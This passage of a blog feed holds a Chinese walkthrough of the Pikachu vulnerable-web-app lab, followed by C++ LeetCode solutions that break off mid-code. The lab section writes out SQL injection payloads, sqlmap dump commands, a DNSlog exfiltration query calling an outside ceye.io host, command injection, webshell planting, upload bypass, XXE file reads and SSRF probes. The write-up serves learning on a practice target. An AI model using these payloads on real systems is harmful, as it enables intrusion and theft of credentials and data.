style="zoom:25%;"></p><p>此处选择更改useragent，应该是获取之后insert到表中，但是不知道具体顺序，所以我们还是采取报错查询</p><p>构造useragent如下，但是用注释符一直报错，查看源码，如图所示，后面应该用括号闭合</p><figure><img src="/post/7cfe8c25/image-20231208203421758.png" alt="image-20231208203421758"><figcaption aria-hidden="true">image-20231208203421758</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1, concat(0x7e, (select group_concat(concat_ws(&#x27;-&#x27;,username,password)) from users ),0x7e), 1),1,1 )#</span><br></pre></td></tr></table></figure><p>这里有点小坑，发现能报错注入之后，尝试获取数据库名称发现很好获取，但是获取用户名密码显示userid不符合格式，通过查看源码发现userid只有在验证用户登录之后才会正确赋值，所以在构造payload之前需要先设置好cookie为登录态</p><p><img src="/post/7cfe8c25/image-20231208204021238.png" alt="image-20231208204021238" style="zoom:25%;"></p><h4 id="盲注base-on-boolian">盲注（base on boolian）</h4><p>盲注可以在and后面添加判断条件，首先判断数据库名长度，然后是每个字符是什么</p><p>此处采用sqlmap工具进行盲注，但是通过测试发现该方法并不行，尝试写脚本解决（待做）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查询数据库【pikachu】 </span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;  --dbs</span><br><span class="line"></span><br><span class="line">#获取数据库中的表【httpinfo,member,message,users,xssblind】 </span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -D pikachu --tables --batch --threads 10 </span><br><span class="line"></span><br><span class="line">#获取表中的字段名【...user,password,...】 </span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;  -D pikachu -T users --columns --batch --threads 10 </span><br><span class="line"></span><br><span class="line">#获取字段信息</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -D pikachu -T users -C username,password --dump --batch --threads 10</span><br></pre></td></tr></table></figure><p>除了sqlmap，通过学习，发现可以通过dnslog注入，构造语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allen<span class="string">&#x27; and if((select load_file(concat(&#x27;</span><span class="operator">/</span><span class="operator">/</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="number">.38</span>rbm5.ceye.io<span class="string">&#x27;))),1,0);#</span></span><br></pre></td></tr></table></figure><p>能发现发起了请求，但是没看到database内容</p><p><img src="/post/7cfe8c25/image-20231209154950331.png" alt="image-20231209154950331" style="zoom:33%;"></p><p>应该是mysql设置的问题，dnslog注入要求数据库有读写权限即：secure_file_priv=“”</p><h4 id="宽字节注入">宽字节注入</h4><p>通过测试发现输入allen'#还是显示没有此人，应该是引号被转义了，所以我们构造宽字节，使得后端为了是我们引号转义添加的%df两个字节通过编码构成一个整的汉字，从而使得引号不被转义，构造如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allen<span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(username,0x3a,password) from users</span></span><br></pre></td></tr></table></figure><p>如图获取了用户名和密码</p><p><img src="/post/7cfe8c25/image-20231209160727966.png" alt="image-20231209160727966" style="zoom:33%;"></p><h3 id="rce">RCE</h3><h4 id="exec-ping">exec "ping"</h4><p>该漏洞即为ping的时候直接将输入的ip地址拼接到ping后面没有进行过滤，导致后面可以拼接其他命令，直接输入以下内容即可输出当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; dir</span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231209161504390.png" alt="image-20231209161504390" style="zoom:25%;"></p><h4 id="exec-eval">exec "eval"</h4><p>如图所示为源码的内容，如果输入的字符无法被执行就输出下面的文本内容</p><p><img src="/post/7cfe8c25/image-20231209162249096.png" alt="image-20231209162249096" style="zoom: 33%;"></p><p>所以输入的字符只要是能执行就可以被成功执行，比如输入：<code>system("dir");</code>，如图所示是执行结果</p><p><img src="/post/7cfe8c25/image-20231209162419095.png" alt="image-20231209162419095" style="zoom:33%;"></p><h3 id="file-inclusion">File Inclusion</h3><h4 id="file-inclusionlocal">File Inclusion(local)</h4><p>通过burp抓取点击提交时的请求包，通过以下两份内容可以得知后端根据传递回来的文件名找取对应的运动员的简介和照片</p><p><img src="/post/7cfe8c25/image-20231209162721541.png" alt="image-20231209162721541" style="zoom: 50%;"><img src="/post/7cfe8c25/image-20231209162728117.png" alt="image-20231209162728117" style="zoom: 50%;"></p><p>通过加引号可以获取上一目录</p><p><img src="/post/7cfe8c25/image-20231209163402116.png" alt="image-20231209163402116" style="zoom:33%;"></p><h4 id="file-inclusionremote">File inclusion(remote)</h4><p>该漏洞是由于include在包含一个文件的时候，如果该文件的内容是php格式的，即使文件后缀是txt，也会当作php执行，我们可以构造一个txt文件，文件内容是在当前目录下生成一个一句话木马的文件，使得后端在include这个文件之后能够字典在当前目录下生成一个一句话木马</p><p>该txt文件作者已经帮我们构造好了</p><p><img src="/post/7cfe8c25/image-20231209170306135.png" alt="image-20231209170306135" style="zoom:25%;"></p><p>通过将这段url传递给include里的内容便可生成一个一句话木马的php文件，如图所示，系统自动帮我们清除掉了，但是这个一句话木马应该是能生效的</p><p><img src="/post/7cfe8c25/image-20231209170417039.png" alt="image-20231209170417039" style="zoom: 50%;"><img src="/post/7cfe8c25/image-20231209170427761.png" alt="image-20231209170427761" style="zoom:50%;"></p><h3 id="unsafe-filedownload">Unsafe Filedownload</h3><h4 id="unsafe-filedownload-1">Unsafe Filedownload</h4><p>如图所示，成功获取到我们想获取的文件内容</p><p><img src="/post/7cfe8c25/image-20231209170826773.png" alt="image-20231209170826773" style="zoom:25%;"></p><h3 id="unsafe-fileupload">Unsafe Fileupload</h3><h4 id="client-check">client check</h4><p>如图所示是在前端检验，先将php文件更改为png文件，然后在传包的时候再更改为php文件，直接用burp发送请求包即可</p><p><img src="/post/7cfe8c25/image-20231209171030032.png" alt="image-20231209171030032" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231209171602746.png" alt="image-20231209171602746" style="zoom: 50%;"></p><p>如图所示，系统又自动给我删了，说明上传成功了，重新上传了phpInfo,如图所示，能正常展示</p><p><img src="/post/7cfe8c25/image-20231209171638525.png" alt="image-20231209171638525" style="zoom:33%;"><img src="/post/7cfe8c25/image-20231209171849749.png" alt="image-20231209171849749" style="zoom:33%;"></p><h4 id="mime-type">MIME type</h4><p>还是用上述一样的方式还是可以绕过</p><h4 id="getimagesize">getimagesize()</h4><p>该函数会在后端对上传的文件名的后缀进行检查，只能是规定之内的，该漏洞的利用要和前面的文件包含漏洞一起使用，也就是构造图片木马，将图片和一句话木马合并成一个图片，然后将该图片上传到服务器上，再通过文件包含漏洞包含该文件，就可以执行我们的一句话木马，攻击就能成功</p><p>将我们构造的图片木马进行上传，通过测试，如果文件就是由php文件更改后缀名上传的仍然会被检测出来，所以需要用真实的照片和文件进行合并上传，然后通过文件包含漏洞包含该文件，如图是攻击过程</p><p><img src="/post/7cfe8c25/image-20231209173053741.png" alt="image-20231209173053741" style="zoom:33%;"><img src="/post/7cfe8c25/image-20231209173337263.png" alt="image-20231209173337263" style="zoom: 25%;"></p><h3 id="over-permission">Over Permission</h3><h4 id="水平越权">水平越权</h4><p>在登录之后查看个人信息的url使用了get请求，只发送了username，可以通过更改username就可以查看其他人的信息，如图所示，即使当前登录者是lili，还是可以通过更改username修改信息</p><p><img src="/post/7cfe8c25/image-20231209173847365.png" alt="image-20231209173847365" style="zoom:33%;"></p><h4 id="垂直越权">垂直越权</h4><p>如图所示是admin删除人时的url，尝试通过普通用户访问该url</p><p><img src="/post/7cfe8c25/image-20231209174237525.png" alt="image-20231209174237525" style="zoom: 50%;"></p><p>访问前访问后没有区别，说明后端应该在删除人时设置了权限识别，查看后端源代码果然在删除时检查了session</p><p><img src="/post/7cfe8c25/image-20231209174553862.png" alt="image-20231209174553862" style="zoom:25%;"><img src="/post/7cfe8c25/image-20231209175011022.png" alt="image-20231209175011022" style="zoom:33%;"></p><p>但是通过查看源代码发现增加信息是没有检查session的，说明增加人的信息是可以通过普通权限做的</p><h3 id="section">../../</h3><h4 id="目录遍历">目录遍历</h4><p>还是构造访问刚才的图片木马</p><p><img src="/post/7cfe8c25/image-20231209180210007.png" alt="image-20231209180210007" style="zoom:33%;"></p><h3 id="敏感信息泄露">敏感信息泄露</h3><h4 id="icanseeyourabc">IcanseeyourABC</h4><p>用户信息出现在前端源代码中</p><p><img src="/post/7cfe8c25/image-20231209180532763.png" alt="image-20231209180532763" style="zoom:50%;"></p><h3 id="php反序列化">PHP反序列化</h3><h4 id="php反序列化漏洞">PHP反序列化漏洞</h4><p>查看源代码可以看到，将输入的php反序列化之后会输出变量test的内容，我们可以构造test内容为敏感信息，这样就能获取用户的敏感信息</p><p>构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:39:&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/post/7cfe8c25/image-20231209181653991.png" alt="image-20231209181653991" style="zoom: 33%;"></p><h3 id="xxe">XXE</h3><h4 id="xxe漏洞">XXE漏洞</h4><p>漏洞原理应该就是构造xml上传到服务器使得服务器解析之后执行返回结果，漏洞原理就是通过外部引用，访问服务器内部文件，并显示在前端界面，如下面所示，外部引用中外部DTD的URI可以是服务器敏感文件的目录，就可以敏感文件的信息赋值给我们的根元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">① 内部申明DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 [元素申明]&gt;</span><br><span class="line"></span><br><span class="line">② 外部引用DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br><span class="line"></span><br><span class="line">③ 引用公共DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>比如此处可以使用如下构造方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///D://phpstudy_pro//WWW//pikachu//vul//unsafeupload//uploads//2023//12//09//158078657433f03558f337815476.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;f;&lt;/name&gt;</span><br></pre></td></tr></table></figure><p>便获取到了文件内容</p><p><img src="/post/7cfe8c25/image-20231209183749124.png" alt="image-20231209183749124" style="zoom:33%;"></p><h3 id="url重定向">URL重定向</h3><h4 id="不安全的url跳转">不安全的URL跳转</h4><p>url重定向导致钓鱼，就是设置一个按钮，该按钮链接到钓鱼网站</p><h3 id="ssrf">SSRF</h3><h4 id="ssrfcurl">SSRF(curl)</h4><p>如图所示，再url后面可以跟上我们上传的恶意文件并执行，我访问了一个上传的php文件，成功执行</p><p><img src="/post/7cfe8c25/image-20231209190208590.png" alt="image-20231209190208590" style="zoom:33%;"></p><p>PHP支持的由DanielStenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p><p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTPPOST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP基于表单的上传、代理、cookies和用户名+密码的认证。</p><p>curl函数参考：https://www.runoob.com/php/php-ref-curl.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//file协议读取</span><br><span class="line">?url=file:///D://jwt.txt</span><br><span class="line"></span><br><span class="line">//gopher协议</span><br><span class="line">//基本协议格式：URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">?url=gopher://119.23.243.154:22</span><br><span class="line"></span><br><span class="line">//dict协议</span><br><span class="line">?url=dict://119.23.243.154:22</span><br><span class="line"></span><br><span class="line">//http/https协议</span><br><span class="line">?url=http://x.x.x.x/</span><br><span class="line">?url=https://x.x.x.x/</span><br><span class="line"></span><br><span class="line">//探测内网其他主机的端口</span><br><span class="line">?url=http://x.x.x.x:port</span><br></pre></td></tr></table></figure><table><colgroup><col style="width: 33%"><col style="width: 33%"><col style="width: 33%"></colgroup><thead><tr><th style="text-align: left;"><strong>file协议</strong></th><th style="text-align: left;"><strong>http/https协议</strong></th><th style="text-align: left;"><strong>端口</strong></th></tr></thead><tbody><tr><td style="text-align: left;"><strong><img src="/post/7cfe8c25/20200715182340.png" alt="img"></strong></td><td style="text-align: left;"><strong><img src="/post/7cfe8c25/20200715182343.png" alt="img"></strong></td><td style="text-align: left;"><strong><img src="/post/7cfe8c25/20200715182346.png" alt="img"></strong></td></tr></tbody></table><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$URL</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$CH</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$CH</span>) ;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端，并且没做任何过滤或限制。从而导致了用户可能可以通过这个漏洞进行一些内网服务探测等等</p><p>参考：<a href="https://segmentfault.com/a/1190000021810264">SSRF原理实战及修复方式</a></p><h4 id="ssrffile_get_content">SSRF(file_get_content)</h4><p>一样的构造方法</p><p><img src="/post/7cfe8c25/image-20231209190914600.png" alt="image-20231209190914600" style="zoom:25%;"></p><p>file_get_contents()把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><p>函数语法:file_get_contents(path,include_path,context,start,max_length)</p><table><colgroup><col style="width: 16%"><col style="width: 83%"></colgroup><thead><tr><th style="text-align: left;">参数</th><th style="text-align: left;">描述</th></tr></thead><tbody><tr><td style="text-align: left;">path</td><td style="text-align: left;">必需。规定要读取的文件。</td></tr><tr><td style="text-align: left;">include_path</td><td style="text-align: left;">可选。如果您还想在 include_path（在php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td style="text-align: left;">context</td><td style="text-align: left;">可选。规定文件句柄的环境。context是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td></tr><tr><td style="text-align: left;">start</td><td style="text-align: left;">可选。规定在文件中开始读取的位置。该参数是PHP 5.1 中新增的。</td></tr><tr><td style="text-align: left;">max_length</td><td style="text-align: left;">可选。规定读取的字节数。该参数是 PHP 5.1中新增的。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//file协议读取</span><br><span class="line">?file=file:///D://jwt.txt</span><br><span class="line"></span><br><span class="line">//读取php源码</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br><span class="line"></span><br><span class="line">//内网其它主机请求</span><br><span class="line">?file=http://x.x.x.x/xx.index</span><br><span class="line"></span><br><span class="line">//探测内网其他主机的端口</span><br><span class="line">?file=http://x.x.x.x:port</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接访问获取到的文件</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;总耗时：两天&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>leetcode面试100题</title>
    <link href="http://example.com/post/4d65bd11.html"/>
    <id>http://example.com/post/4d65bd11.html</id>
    <published>2023-09-21T08:01:59.000Z</published>
    <updated>2024-10-08T10:56:44.523Z</updated>
    
    <content type="html"><![CDATA[<p>111</p><span id="more"></span><h2 id="合并两个有序数组简单">合并两个有序数组（简单）</h2><h3 id="题目描述">题目描述</h3><p>给你两个按 <strong>非递减顺序</strong> 排列的整数数组<code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和<code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code>中的元素数目。</p><p>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code>中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p><p><strong>注意：</strong>最终，合并后数组不应由函数返回，而是存储在数组<code>nums1</code> 中。为了应对这种情况，<code>nums1</code> 的初始长度为<code>m + n</code>，其中前 <code>m</code> 个元素表示应合并的元素，后<code>n</code> 个元素为 <code>0</code> ，应忽略。<code>nums2</code>的长度为 <code>n</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3</span><br><span class="line">输出：[1,2,2,3,5,6]</span><br><span class="line">解释：需要合并 [1,2,3] 和 [2,5,6] 。</span><br><span class="line">合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。</span><br></pre></td></tr></table></figure><h3 id="思路">思路</h3><p>从后往前存数组的值，因为从前往后存会改变nums[1]前面没有用的值，所以尝试将较大值存在Nums[1]后面</p><h3 id="代码">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> end=(m--)+(n--)<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(end&gt;=<span class="number">0</span>&amp;&amp;end!=m)</span><br><span class="line">            nums1[end--]=(m&lt;<span class="number">0</span>||(n&gt;=<span class="number">0</span>&amp;&amp;nums2[n]&gt;=nums1[m]))?nums2[n--]:nums1[m--];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="填充每个节点的下一个右侧节点指针ⅱ中等">填充每个节点的下一个右侧节点指针Ⅱ（中等）</h2><h3 id="题目描述-1">题目描述</h3><p>给定一个二叉树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">  int val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充它的每个 next指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将next 指针设置为 <code>NULL</code> 。</p><p>初始状态下，所有 next 指针都被设置为 <code>NULL</code> 。</p><p><strong>示例 1：</strong></p><figure><img src="/post/4d65bd11/117_sample.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：root = [1,2,3,4,5,null,7]</span><br><span class="line">输出：[1,#,2,3,#,4,5,7,#]</span><br><span class="line">解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化输出按层序遍历顺序（由 next 指针连接），&#x27;#&#x27; 表示每层的末尾。</span><br></pre></td></tr></table></figure><h3 id="思路-1">思路</h3><p>BFS，但是不用额外的空间，比如遍历了第二层所有节点并连接了，只需要直到第二层的首节点，便可通过next找到下一个节点</p><h3 id="代码-1">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)<span class="keyword">return</span> root;</span><br><span class="line">        Node*ans=root;</span><br><span class="line">        Node* line;</span><br><span class="line">        Node* line2;</span><br><span class="line">        root-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            line=<span class="literal">NULL</span>;</span><br><span class="line">            line2=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">while</span>(root)&#123;</span><br><span class="line">                <span class="keyword">if</span>(root-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(line==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        line=root-&gt;left;</span><br><span class="line">                        line2=line;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        line-&gt;next=root-&gt;left;</span><br><span class="line">                        line=line-&gt;next;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(root-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(line==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        line=root-&gt;right;</span><br><span class="line">                        line2=line;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        line-&gt;next=root-&gt;right;</span><br><span class="line">                        line=line-&gt;next;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                root=root-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(line)line-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">            root=line2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="移除元素简单">移除元素（简单）</h2><h3 id="题目描述-2">题目描述</h3><p>给你一个数组 <code>nums</code> 和一个值 <code>val</code>，你需要<strong><a href="https://baike.baidu.com/item/原地算法">原地</a></strong>移除所有数值等于 <code>val</code> 的元素，并返回移除后数组的新长度。</p><p>不要使用额外的数组空间，你必须仅使用 <code>O(1)</code> 额外空间并<strong><a href="https://baike.baidu.com/item/原地算法">原地</a>修改输入数组</strong>。</p><p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p><p><strong>说明:</strong></p><p>为什么返回数值是整数，但输出的答案是数组呢?</p><p>请注意，输入数组是以<strong>「引用」</strong>方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p><p>你可以想象内部操作如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝</span><br><span class="line">int len = removeElement(nums, val);</span><br><span class="line"></span><br><span class="line">// 在函数里修改输入数组对于调用者是可见的。</span><br><span class="line">// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2">思路</h3><p>双指针，因为要忽略值为val的元素，所以用两个指针，i指向忽略后的下标，j指向正常下标，当遇到值为val时j继续往前，i就不动</p><h3 id="代码-2">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span 